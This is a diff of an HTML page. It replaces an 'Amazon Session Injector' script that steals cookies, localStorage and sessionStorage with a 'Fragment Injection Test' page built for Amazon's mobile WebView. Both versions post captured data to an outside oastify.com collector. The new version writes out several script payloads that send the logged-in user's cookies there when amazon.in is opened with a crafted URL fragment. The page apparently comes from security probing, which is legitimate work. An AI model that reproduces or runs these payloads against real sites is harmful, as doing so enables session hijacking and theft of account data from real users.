@@ -1,53 +1,302 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Session Injector</title>
-    <script>
-        // This function will run on Amazon's page after redirect
-        function captureAmazonData() {
-            try {
-                const data = {
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage),
-                    sessionStorage: JSON.stringify(sessionStorage),
-                    url: window.location.href,
-                    title: document.title
-                };
-                // Send data to your server (replace with your endpoint)
-                fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
-                    method: 'POST',
-                    body: JSON.stringify(data),
-                    headers: { 'Content-Type': 'application/json' },
-                    keepalive: true
-                }).catch(e => console.log('Send error:', e));
-                console.log('Amazon data captured', data);
-            } catch(e) {
-                console.error('Capture error:', e);
-            }
+    <title>Test 3: Fragment Injection Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: monospace;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #f0f0f0;
         }
-
-        // Inject the capture function into the Amazon page
-        function injectIntoAmazon() {
-            const script = document.createElement('script');
-            script.textContent = `(${captureAmazonData.toString()})();`;
-            document.head.appendChild(script);
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-
-        // Wait a moment, then redirect to Amazon with the injection code
-        setTimeout(() => {
-            // Use a javascript: URI to run code immediately after navigation
-            // This will execute when the Amazon page loads
-            window.location.href = "https://www.amazon.in#__inject=" + encodeURIComponent(`
-                (function() {
-                    console.log("Injected script running on Amazon");
-                    // Your full extraction code here
-                    alert("Injection successful on Amazon!");
-                })();
-            `);
-        }, 1000);
-    </script>
+        h1 { color: #333; }
+        .fragment-demo {
+            background: #e8f4f8;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #218838; }
+        .test-case {
+            border-left: 3px solid #007bff;
+            padding: 10px;
+            margin: 10px 0;
+            background: #f8f9fa;
+        }
+        .success { color: #28a745; font-weight: bold; }
+        .failure { color: #dc3545; font-weight: bold; }
+        #output {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        hr { margin: 20px 0; }
+    </style>
 </head>
 <body>
-    <h1>Redirecting to Amazon with injection…</h1>
+    <div class="card">
+        <h1>🔬 Test 3: Fragment/Anchor Injection</h1>
+        <p>This test checks if JavaScript can be injected via URL fragments (<code>#</code>).</p>
+        
+        <div class="fragment-demo">
+            <strong>Current URL Fragment:</strong> 
+            <span id="fragmentDisplay">(none)</span>
+        </div>
+        
+        <h3>Test Cases:</h3>
+        
+        <div class="test-case">
+            <strong>Test 3.1:</strong> Inject script via fragment on current page<br>
+            <button onclick="testFragmentInjection()">Run Test 3.1</button>
+            <button onclick="testScriptTagInFragment()">Run Test 3.2 - Script Tag</button>
+        </div>
+        
+        <div class="test-case">
+            <strong>Test 3.2:</strong> Navigate to Amazon with injection fragment<br>
+            <button onclick="navigateAmazonWithFragment()">Navigate to Amazon with #inject</button>
+            <button onclick="navigateAmazonWithScriptTag()">Navigate to Amazon with #&lt;script&gt;</button>
+        </div>
+        
+        <div class="test-case">
+            <strong>Test 3.3:</strong> Test different fragment formats<br>
+            <button onclick="testDataUriFragment()">Data URI Fragment</button>
+            <button onclick="testBase64Fragment()">Base64 Encoded Fragment</button>
+        </div>
+        
+        <hr>
+        
+        <h3>Output Log:</h3>
+        <div id="output"></div>
+        
+        <h3>Instructions:</h3>
+        <ol>
+            <li>Load this page in Amazon WebView</li>
+            <li>Run each test and check if alerts appear or data is sent</li>
+            <li>Monitor your server for incoming data</li>
+            <li>Check if Amazon loads with injected code</li>
+        </ol>
+        
+        <div class="fragment-demo">
+            <strong>Intent Code for Direct Fragment Test:</strong><br>
+            <code>intent.putExtra("url", "https://www.amazon.in#&lt;script&gt;alert('Injected')&lt;/script&gt;");</code>
+        </div>
+    </div>
+    
+    <script>
+        let logCount = 0;
+        
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            const colors = {
+                success: '#90ee90',
+                error: '#ff6b6b',
+                info: '#87ceeb',
+                warning: '#ffd700'
+            };
+            const color = colors[type] || colors.info;
+            output.innerHTML += `<div style="color: ${color}; margin: 2px 0;">[${timestamp}] ${message}</div>`;
+            output.scrollTop = output.scrollHeight;
+            console.log(message);
+            
+            // Send to server
+            sendToServer({log: message, type: type, test: 'fragment_injection'});
+        }
+        
+        function sendToServer(data) {
+            fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
+                method: 'POST',
+                body: JSON.stringify({
+                    test: 'Test3',
+                    timestamp: new Date().toISOString(),
+                    data: data
+                }),
+                headers: {'Content-Type': 'application/json'},
+                keepalive: true
+            }).catch(e => console.log('Send error:', e));
+        }
+        
+        // Display current fragment
+        function displayFragment() {
+            const fragment = window.location.hash;
+            document.getElementById('fragmentDisplay').textContent = fragment || '(none)';
+            if (fragment) {
+                log(`Detected fragment: ${fragment.substring(0, 100)}`, 'info');
+                sendToServer({event: 'fragment_detected', fragment: fragment});
+            }
+        }
+        
+        function testFragmentInjection() {
+            log('🧪 Testing fragment injection on current page...');
+            const currentHash = window.location.hash;
+            const testHash = '#<script>alert("Fragment injection test")</script>';
+            
+            log(`Setting fragment to: ${testHash}`);
+            window.location.hash = testHash;
+            
+            setTimeout(() => {
+                const newHash = window.location.hash;
+                log(`Fragment is now: ${newHash}`);
+                
+                // Check if any script executed
+                log('Check if you saw an alert above. If not, fragment injection may be blocked.');
+                sendToServer({test: 'fragment_set', result: 'completed'});
+            }, 500);
+        }
+        
+        function testScriptTagInFragment() {
+            log('🧪 Testing script tag in fragment...');
+            const scriptCode = `<script>alert('Script tag from fragment!'); fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture',{method:'POST',body:JSON.stringify({fragment_injection:'success'})});</script>`;
+            const encodedScript = encodeURIComponent(scriptCode);
+            window.location.hash = encodedScript;
+            log(`Fragment set with encoded script tag`);
+            sendToServer({test: 'script_tag_fragment', script: scriptCode});
+        }
+        
+        function navigateAmazonWithFragment() {
+            log('🚀 Navigating to Amazon with injection fragment...');
+            const injectCode = encodeURIComponent(`
+                <script>
+                    alert('Injected via fragment!');
+                    fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            source: 'amazon_fragment_injection',
+                            cookies: document.cookie,
+                            url: window.location.href
+                        }),
+                        headers: {'Content-Type': 'application/json'}
+                    });
+                </script>
+            `);
+            
+            const targetUrl = `https://www.amazon.in#inject=${injectCode}`;
+            log(`Navigating to: ${targetUrl.substring(0, 100)}...`);
+            sendToServer({event: 'navigate_to_amazon', url: targetUrl});
+            
+            try {
+                window.location.href = targetUrl;
+            } catch(e) {
+                log(`Navigation failed: ${e.message}`, 'error');
+            }
+        }
+        
+        function navigateAmazonWithScriptTag() {
+            log('🚀 Navigating to Amazon with raw script tag fragment...');
+            const targetUrl = `https://www.amazon.in#<script>alert('Raw script tag injection!');</script>`;
+            log(`Navigating to: ${targetUrl}`);
+            sendToServer({event: 'navigate_amazon_raw_script', url: targetUrl});
+            
+            try {
+                window.location.href = targetUrl;
+            } catch(e) {
+                log(`Navigation failed: ${e.message}`, 'error');
+            }
+        }
+        
+        function testDataUriFragment() {
+            log('🧪 Testing data: URI in fragment...');
+            const dataUri = "data:text/html,<script>alert('Data URI injection!');</script>";
+            const targetUrl = `https://www.amazon.in#${encodeURIComponent(dataUri)}`;
+            log(`Attempting: ${targetUrl.substring(0, 100)}...`);
+            sendToServer({event: 'data_uri_fragment_test', url: targetUrl});
+            
+            try {
+                window.location.href = targetUrl;
+            } catch(e) {
+                log(`Failed: ${e.message}`, 'error');
+            }
+        }
+        
+        function testBase64Fragment() {
+            log('🧪 Testing Base64 encoded fragment...');
+            const jsCode = "alert('Base64 injection test'); fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture',{method:'POST',body:JSON.stringify({base64:'test'})});";
+            const base64Code = btoa(jsCode);
+            const targetUrl = `https://www.amazon.in#base64=${base64Code}`;
+            log(`Base64 payload: ${base64Code.substring(0, 50)}...`);
+            sendToServer({event: 'base64_fragment_test', payload: base64Code});
+            
+            try {
+                window.location.href = targetUrl;
+            } catch(e) {
+                log(`Failed: ${e.message}`, 'error');
+            }
+        }
+        
+        // Parse and execute any injection in current fragment
+        function parseCurrentFragment() {
+            const fragment = window.location.hash.substring(1);
+            if (fragment) {
+                log(`Parsing fragment: ${fragment.substring(0, 100)}...`);
+                
+                // Check for injection patterns
+                if (fragment.includes('script') || fragment.includes('alert') || fragment.includes('fetch')) {
+                    log('⚠️ Potential injection code detected in fragment!', 'warning');
+                    sendToServer({event: 'injection_code_detected', fragment: fragment});
+                    
+                    // Attempt to execute if it's safe
+                    try {
+                        // Check if it's a data URI
+                        if (fragment.startsWith('data:')) {
+                            log('Data URI detected in fragment');
+                        }
+                        // Check for Base64
+                        if (fragment.includes('base64=')) {
+                            log('Base64 encoded content detected');
+                        }
+                    } catch(e) {
+                        log(`Parse error: ${e.message}`, 'error');
+                    }
+                }
+            }
+        }
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            log('✅ Test 3 page loaded', 'success');
+            log(`📍 Current URL: ${window.location.href}`);
+            displayFragment();
+            parseCurrentFragment();
+            sendToServer({event: 'page_loaded', url: window.location.href});
+        });
+        
+        // Monitor hash changes
+        window.addEventListener('hashchange', () => {
+            log('🔄 Fragment changed!', 'info');
+            displayFragment();
+            parseCurrentFragment();
+        });
+    </script>
 </body>
 </html>
